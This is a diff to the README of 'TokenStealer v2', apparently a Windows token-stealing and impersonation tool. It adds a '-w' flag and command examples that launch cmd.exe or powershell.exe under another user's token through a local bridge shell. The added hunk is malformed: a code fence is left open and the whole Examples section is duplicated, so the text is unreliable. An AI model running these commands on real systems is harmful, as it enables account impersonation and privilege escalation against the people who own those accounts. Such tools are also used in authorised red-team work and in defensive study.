@@ -51,11 +51,11 @@ cl /EHsc /W4 /DUNICODE /D_UNICODE TokenStealer_v2.cpp ntdll.lib advapi32.lib ws2
 TokenStealer.exe [filters] [-l] [--unique] [--csv|--json]
 TokenStealer.exe [filters] -c <program> [-x <index>]
 TokenStealer.exe [-i] [--nobridge] [-P <port>]
+TokenStealer.exe -u <user> -w [-c <program>] [-P <port>]
 ```
 
-If `-c` is omitted the tool lists tokens instead of launching anything. Plain
-`-l` in a real console opens the interactive menu (see below); redirection or
-`--csv`/`--json` keeps the textual output.
+If `-c` is omitted the tool lists tokens instead of launching anything. Use
+`-i` / `--interactive` to open the interactive menu (see below).
 
 ### Filters
 
@@ -79,7 +79,7 @@ If `-c` is omitted the tool lists tokens instead of launching anything. Plain
 
 | Flag | Meaning |
 |------|---------|
-| `-l` | List accounts. In a console this opens the interactive menu. |
+| `-l` | List accounts (plain table). Use `-i` for the interactive menu. |
 | `-e` | Extended static table: `#  ACCOUNT  TYPE  LEVEL  PID  SESSION`. |
 | `--unique` | Aggregate by account instead of one row per token. |
 | `--csv` | CSV to stdout (add `-e` for all columns). |
@@ -90,6 +90,7 @@ If `-c` is omitted the tool lists tokens instead of launching anything. Plain
 | Flag | Meaning |
 |------|---------|
 | `-i`, `--interactive` | Force the interactive menu (any listing mode). |
+| `-w` | Force impersonation + bridge for `-u <user>`, skipping the menu. |
 | `--nobridge` | Never use the local bridge; always launch directly. |
 | `-P <n>`, `--port <n>` | Bridge listener port on `127.0.0.1` (default `4444`). |
 
@@ -110,6 +111,9 @@ If `-c` is omitted the tool lists tokens instead of launching anything. Plain
 | `4` | Token found but process creation failed. |
 
 ## Interactive menu
+
+The menu is opened by `-i` / `--interactive`; `-l` on its own prints the plain
+table and does not wait for input.
 
 ```
 TokenStealer v2 - Windows token enumerator / impersonator
@@ -144,6 +148,9 @@ What happens after you confirm depends on privileges and flags:
 | not held | given | Direct launch via `ExecuteWithToken` (no bridge). |
 | not held | not given | Local bridge on `127.0.0.1:<port>`. |
 
+`-w` with `-u <user>` bypasses this menu entirely: it forces the impersonation
+path and the bridge, using the program from `-c` (default `cmd.exe`).
+
 ## Local bridge
 
 When the impersonation path is used and the bridge is allowed, the tool:
@@ -162,7 +169,7 @@ When the impersonation path is used and the bridge is allowed, the tool:
 your console <-> listener socket <-> bridge child <-> pipes <-> program
 ```
 
-This path uses `cmd.exe` or whatever you choose over pipes has no
+This path uses no PowerShell and is loopback-only. `cmd.exe` over pipes has no
 console, so it may not print a banner or prompt — type a command and press Enter.
 Type `exit` inside the shell to end it.
 
@@ -194,7 +201,7 @@ just account names.
 
 ## Examples
 
-List every token the current user can see (opens the menu in a console):
+List every token the current user can see:
 
 ```bat
 TokenStealer.exe -l
@@ -236,6 +243,80 @@ Never use the bridge (direct launch only):
 TokenStealer.exe -l --nobridge
 ```
 
+Force the bridge for a specific user without the menu (program defaults to `cmd.exe`):
+
+```bat
+TokenStealer.exe -u CORP\alice -w
+TokenStealer.exe -u CORP\alice -w -c powershell.exe -P 5555
+```
+
+Direct launch with `-c`:
+
+```bat
+TokenStealer.exe -u CORP\alice -c cmd.exe
+TokenStealer.exe -u CORP\alice -c cmd.exe -t
+```
+
+Pick a token by its table index:
+
+```bat
+TokenStealer.exe -e
+TokenStealer.exe -x 5 -c cmd.exe
+
+
+
+
+## Examples
+
+List every token the current user can see:
+
+```bat
+TokenStealer.exe -l
+```
+
+Static extended table:
+
+```bat
+TokenStealer.exe -e
+```
+
+Aggregate by account:
+
+```bat
+TokenStealer.exe -l --unique
+```
+
+Only primary tokens:
+
+```bat
+TokenStealer.exe -e -b 1
+```
+
+Only tokens in process 100:
+
+```bat
+TokenStealer.exe -l -p 100
+```
+
+Interactive menu with a custom bridge port:
+
+```bat
+TokenStealer.exe -i -P 5555
+```
+
+Never use the bridge (direct launch only):
+
+```bat
+TokenStealer.exe -l --nobridge
+```
+
+Force the bridge for a specific user without the menu (program defaults to `cmd.exe`):
+
+```bat
+TokenStealer.exe -u CORP\alice -w
+TokenStealer.exe -u CORP\alice -w -c powershell.exe -P 5555
+```
+
 Direct launch with `-c`:
 
 ```bat
@@ -249,6 +330,7 @@ Pick a token by its table index:
 TokenStealer.exe -e
 TokenStealer.exe -x 5 -c cmd.exe
 ```
+
 <img width="1404" height="1078" alt="image" src="https://github.com/user-attachments/assets/a2c919a0-0f44-47e0-ad5c-4b6c70058b88" />
 
 
